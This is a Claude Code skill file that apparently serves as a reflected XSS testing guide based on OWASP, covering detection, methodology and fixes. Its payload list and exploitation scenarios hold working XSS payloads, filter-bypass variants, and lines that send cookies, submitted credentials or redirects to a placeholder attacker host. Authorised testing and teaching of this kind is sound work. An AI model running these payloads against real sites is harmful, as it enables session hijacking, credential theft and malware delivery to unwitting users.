---
name: xss-reflected
description: >
  Reflected XSS occurs when user-supplied input is echoed in an HTTP response without sanitization, allowing script execution in the victim's browser. Detect via injecting `<script>alert(1)</script>`, event handlers like `onfocus`, HTML entity bypass, and encoding variants. Tools: Burp Suite, OWASP ZAP, PHP Charset Encoder (PCE), Hackvertor, XSS-Proxy, ratproxy.
license: MIT
compatibility: Designed for Claude Code. Requires Burp Suite or OWASP ZAP.
metadata:
  category: web
  version: "0.1"
  source: https://owasp.org/www-project-web-security-testing-guide/stable/
  source_types: framework
  wstg: WSTG-INPV-01
---

# Reflected Cross-Site Scripting (XSS)

## What Is Broken and Why
Reflected XSS occurs when an application takes user-supplied data (URL parameters, form fields, HTTP headers) and includes it in the HTTP response without proper output encoding. The browser interprets the injected content as executable script, running in the context of the vulnerable origin. Because the payload travels in the request, the attacker must socially-engineer the victim into clicking a crafted link. The root cause is missing context-aware output encoding.

## Key Signals
- Input parameter value appears verbatim in the HTML response source
- Special characters `<`, `>`, `"`, `'`, `&` are not HTML-encoded in responses
- JavaScript context: input reflected inside `<script>` blocks or event handlers without escaping `'`, `"`, `\`
- Error messages or page titles echoing raw query strings
- HTTP headers (User-Agent, Referer) reflected in error pages

## Methodology
1. Map all input vectors: URL parameters, POST body fields, hidden form fields, HTTP headers, cookie values.
2. Submit a canary string (e.g., `xss12345`) and search the response for its unencoded presence.
3. Identify the HTML context of the reflection: tag body, attribute, script block, URL, CSS.
4. Craft a context-appropriate payload:
   - Tag body: `<script>alert(1)</script>`
   - Attribute: `" onfocus="alert(1)` or `" onmouseover="alert(1)`
   - Script block: `';alert(1)//`
   - URL context: `javascript:alert(1)`
5. Test filter bypass variants if initial payloads are blocked.
6. Verify execution in a real browser (not just source inspection).
7. Escalate to cookie theft, credential harvesting, or redirect payloads.

## Payloads & Tools
```
# Basic tag-body injection
TARGET/page?user=<script>alert(1)</script>

# Attribute context break-out
TARGET/page?user="><script>alert(document.cookie)</script>
TARGET/page?user=" onfocus="alert(1)" autofocus="

# Script block context
TARGET/page?user=';alert(document.cookie)//

# Cookie exfiltration
TARGET/page?user=<script>document.location='http://VICTIM/steal?c='+document.cookie</script>

# Link manipulation via onload
TARGET/page?user=<script>window.onload=function(){var a=document.getElementsByTagName('a');a[0].href='http://VICTIM/malicious';}</script>

# Filter bypass: case variation
TARGET/page?user="><ScRiPt>alert(1)</ScRiPt>

# Filter bypass: space in tag
TARGET/page?user="><script >alert(1)</script >

# Filter bypass: URL encoding
TARGET/page?user=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E

# Filter bypass: double-encoded
TARGET/page?user=%2522%253E%253Cscript%253Ealert(1)%253C%252Fscript%253E

# Filter bypass: non-recursive filter
TARGET/page?user=<scr<script>ipt>alert(1)</script>

# HTTP Parameter Pollution
TARGET/page?param=<script&param=>alert(1)</&param=script>

# Burp Suite Intruder with XSS payloads wordlist
# Load: Intruder -> Payloads -> Load fuzz-XSS.txt from SecLists
```

## Bypass Techniques
- Case variation: `<ScRiPt>`, `<SCRIPT>`
- Space insertion in tags: `<script >`, `< script>`
- URL encoding: `%3C`, `%3E`, `%22`
- Double URL encoding: `%253C`
- HTML entity encoding in attribute context: `&lt;`, `&#60;`, `&#x3c;`
- Null bytes: `<%00script>`
- Tab/newline insertion: `<scr\tipt>`, `<scr\nipt>`
- Alternative event handlers: `onerror`, `onload`, `onmouseover`, `onfocus`, `autofocus`
- SVG vectors: `<svg onload=alert(1)>`
- IMG fallback: `<img src=x onerror=alert(1)>`
- Regex bypass for script-src filters: `<SCRIPT%20a=">"%20SRC="http://VICTIM/xss.js"></SCRIPT>`
- HTTP Parameter Pollution to split tag across params

## Exploitation Scenarios
**Scenario 1 — Session Hijacking**
Setup: Search results page reflects `q=` parameter in page title without encoding.
Trigger: Attacker sends victim link: `TARGET/search?q=<script>new Image().src='http://VICTIM/c?x='+document.cookie</script>`
Impact: Session cookie transmitted to attacker; full account takeover.

**Scenario 2 — Credential Harvesting via Page Modification**
Setup: Login page `redirect` parameter reflected in a JavaScript string.
Trigger: `TARGET/login?redirect=';document.forms[0].action='http://VICTIM/capture';//` — form submission redirected to attacker.
Impact: Plaintext credentials exfiltrated on login.

**Scenario 3 — Malware Distribution**
Setup: Error page reflects filename parameter in body without encoding.
Trigger: `TARGET/download?file=<script>window.onload=function(){var a=document.getElementsByTagName('a');a[0].href='http://VICTIM/malware.exe';}</script>`
Impact: Victim downloads malware when clicking any link on the page.

## False Positives
- HTML encoding happening after source inspection — verify payload executes in browser, not just that it appears in source
- Framework escaping that happens at render time not visible in raw HTTP response
- CSP blocking execution even when payload is reflected
- Canary string present in HTML comments (no execution context)

## Fix Patterns
- Context-aware output encoding: HTML-encode in tag body, attribute-encode in attributes, JS-encode in script blocks
- Content Security Policy header: `Content-Security-Policy: default-src 'self'; script-src 'self'`
- `X-XSS-Protection: 1; mode=block` (legacy browsers)
- Avoid reflecting untrusted input into script blocks or event handlers
- Use trusted templating engines with auto-escaping enabled by default

## Related Skills

When the injection point persists server-side, escalate to [[xss-stored]] for higher-impact payloads that don't require victim interaction. If the sink is in JavaScript code reading from `location.hash` or `document.referrer`, treat as [[dom-xss]] and look for dangerous sinks like `innerHTML` or `eval`. Reflected XSS can be used to bypass SameSite and execute [[csrf]] on the same origin, since the browser delivers both the XSS and the CSRF forged request from the target origin itself. Filter bypass encoding tricks used here also apply to [[cmd-injection]] when both share the same input sanitization layer.
